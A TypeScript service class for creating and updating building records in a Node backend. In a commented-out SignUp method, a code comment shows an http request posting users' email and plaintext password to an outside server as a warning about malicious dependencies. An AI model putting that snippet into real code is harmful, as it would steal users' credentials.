import { Container, Service, Inject } from 'typedi';

import jwt from 'jsonwebtoken';
import config from '../../config';
import argon2 from 'argon2';
import { randomBytes } from 'crypto';

//import MailerService from './mailer.ts.bak';

import IBuildingService from './IServices/IBuildingService';
import { BuildingMap } from "../mappers/BuildingMap";
import { IBuildingDTO } from '../dto/IBuildingDTO';

import IBuildingRepo from './IRepos/IBuildingRepo';

import { Building } from '../domain/building';



import { Result } from "../core/logic/Result";

@Service()
export default class BuildingService implements IBuildingService{
  constructor(
      @Inject(config.repos.building.name) private buildingRepo : IBuildingRepo,
      //@Inject(config.repos.Building.name) private BuildingRepo : IBuildingRepo,
      @Inject('logger') private logger,
  ) {}

    public async CreateBuilding(buildingDTO: IBuildingDTO): Promise<Result<{ buildingDTO: IBuildingDTO; }>> {


        const buildingOrError = await Building.create({
            buildingId: buildingDTO.buildingId,
            buildingName: buildingDTO.buildingName,
            description: buildingDTO.description,
            height: buildingDTO.height,
            width: buildingDTO.width,
            numOfFloors: buildingDTO.numOfFloors,
            floors: buildingDTO.floors,
            elevatorFloors: buildingDTO.elevatorFloors
          });

          if (buildingOrError.isFailure) {
            throw Result.fail<IBuildingDTO>(buildingOrError.errorValue());
          }

        
        const buildingResult = buildingOrError.getValue();
        await this.buildingRepo.save(buildingResult);
        const buildingDTOResult = BuildingMap.toDTO( buildingResult ) as IBuildingDTO;
        return Result.ok<{buildingDTO: IBuildingDTO}>( {buildingDTO: buildingDTOResult} )
  }

  public async updateBuilding(buildingDTO: IBuildingDTO): Promise<Result<{ buildingDTO: IBuildingDTO; }>>  {
    try {
      const Building = await this.buildingRepo.findByName(buildingDTO.buildingName);

      if (Building === null) {
        return Result.fail<{buildingDTO: IBuildingDTO}>("Building not found");
      }
      else {
        Building.name = buildingDTO.buildingName;
        Building.description = buildingDTO.description;
        Building.height = buildingDTO.height;
        Building.width = buildingDTO.width;
        Building.numOfFloors = buildingDTO.numOfFloors;
        Building.floors = buildingDTO.floors;
        Building.elevatorFloors = buildingDTO.elevatorFloors;
        
        await this.buildingRepo.save(Building);

        const BuildingDTOResult = BuildingMap.toDTO( Building ) as IBuildingDTO;
        return Result.ok<{buildingDTO: IBuildingDTO}>( {buildingDTO: BuildingDTOResult} )
        }
    } catch (e) {
      throw e;
    }
  }



  /*public async SignUp(userDTO: IUserDTO): Promise<Result<{ userDTO: IUserDTO, token: string }>> {
    try {
      const userDocument = await this.userRepo.findByEmail( userDTO.email );
      const found = !!userDocument;
  
      if (found) {
        return Result.fail<{userDTO: IUserDTO, token: string}>("User already exists with email=" + userDTO.email);
      }

      /**
       * Here you can call to your third-party malicious server and steal the user password before it's saved as a hash.
       * require('http')
       *  .request({
       *     hostname: 'http://my-other-api.com/',
       *     path: '/store-credentials',
       *     port: 80,
       *     method: 'POST',
       * }, ()=>{}).write(JSON.stringify({ email, password })).end();
       *
       * Just kidding, don't do that!!!
       *
       * But what if, an NPM module that you trust, like body-parser, was injected with malicious code that
       * watches every API call and if it spots a 'password' and 'email' property then
       * it decides to steal them!? Would you even notice that? I wouldn't :/
             

      const salt = randomBytes(32);
      this.logger.silly('Hashing password');
      const hashedPassword = await argon2.hash(userDTO.password, { salt });
      this.logger.silly('Creating user db record');

      const password = await UserPassword.create({ value: hashedPassword, hashed: true}).getValue();
      const email = await UserEmail.create( userDTO.email ).getValue();
      let Building: Building;

      const BuildingOrError = await this.getBuilding(userDTO.Building);
      if (BuildingOrError.isFailure) {
        return Result.fail<{userDTO: IUserDTO; token: string}>(BuildingOrError.error);
      } else {
        Building = BuildingOrError.getValue();
      }

      const userOrError = await User.create({
        firstName: userDTO.firstName,
        lastName: userDTO.lastName,
        email: email,
        Building: Building,
        password: password,
      });

      if (userOrError.isFailure) {
        throw Result.fail<IUserDTO>(userOrError.errorValue());
      }

      const userResult = userOrError.getValue();

      this.logger.silly('Generating JWT');
      const token = this.generateToken(userResult);

      this.logger.silly('Sending welcome email');
      //await this.mailer.SendWelcomeEmail(userResult);

      //this.eventDispatcher.dispatch(events.user.signUp, { user: userResult });

      await this.userRepo.save(userResult);
      const userDTOResult = UserMap.toDTO( userResult ) as IUserDTO;
      return Result.ok<{userDTO: IUserDTO, token: string}>( {userDTO: userDTOResult, token: token} )

    } catch (e) {
      this.logger.error(e);
      throw e;
    }
  }*/

  


}
